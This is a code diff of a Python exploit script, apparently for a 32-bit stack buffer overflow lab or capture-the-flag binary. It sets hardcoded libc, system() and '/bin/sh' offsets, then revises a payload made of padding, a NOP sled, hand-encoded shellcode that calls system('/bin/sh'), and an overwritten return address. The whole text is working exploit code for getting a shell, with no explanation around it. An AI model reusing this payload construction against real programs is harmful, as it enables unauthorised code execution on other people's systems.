@@ -5,24 +5,29 @@ buffer_size = 20
 buffer_followup_offset = 9
 libc_base_addr = 0xb7e2c000
 exit_offset = 0x32be0
-system_offset = 0x0003f060 
+system_offset = 0x0003f060
 bin_sh_offset = 0x160c58
-main_ret_offset = 0x0804854b
-shellcode_address =  0xbffff5e6
+str_addr = 0xbfffff58
+shellcode_address = 0xbfffe970
 
 # Create the payload
-payload = b"\xC7\x04\x24"  # mov_dword
-payload += struct.pack("<I", libc_base_addr + bin_sh_offset)
-payload += b"\xe8"          # call
-payload += struct.pack("<i", libc_base_addr + system_offset - (shellcode_address + 12)) # current address for relative call
-payload += b"a" * 8
+payload = b"a" * 20
 payload += b"\x0a"
-payload += b"\x00" * (0x1000 - 21)
-payload += b"a" * 5
+payload += b"\x90" * (0x800 - 21)
+payload += b"\xc7\x04\x24"  # mov_dword
+payload += struct.pack("<I", libc_base_addr + bin_sh_offset)
+payload += b"\xb8"          # push address on eax
+payload += struct.pack("<I", libc_base_addr + system_offset) # current address for relative call
+payload += b"\xff\xd0"      # call eax 
+payload += b"\x00" * (0x800 - 14)
+payload += b"a" * 14
+#payload += b"0123"
+#payload += b"a"
+#payload += b"0123"
 payload += struct.pack("<I", shellcode_address)
-payload += struct.pack("<I", shellcode_address)
-payload += struct.pack("<I", libc_base_addr + exit_offset)
-payload += b"a" * 3
+#payload += struct.pack("<I", shellcode_address)
+#payload += struct.pack("<I", libc_base_addr + exit_offset)
+payload += b"a"
 payload += b"\x0a\x00"
 
 
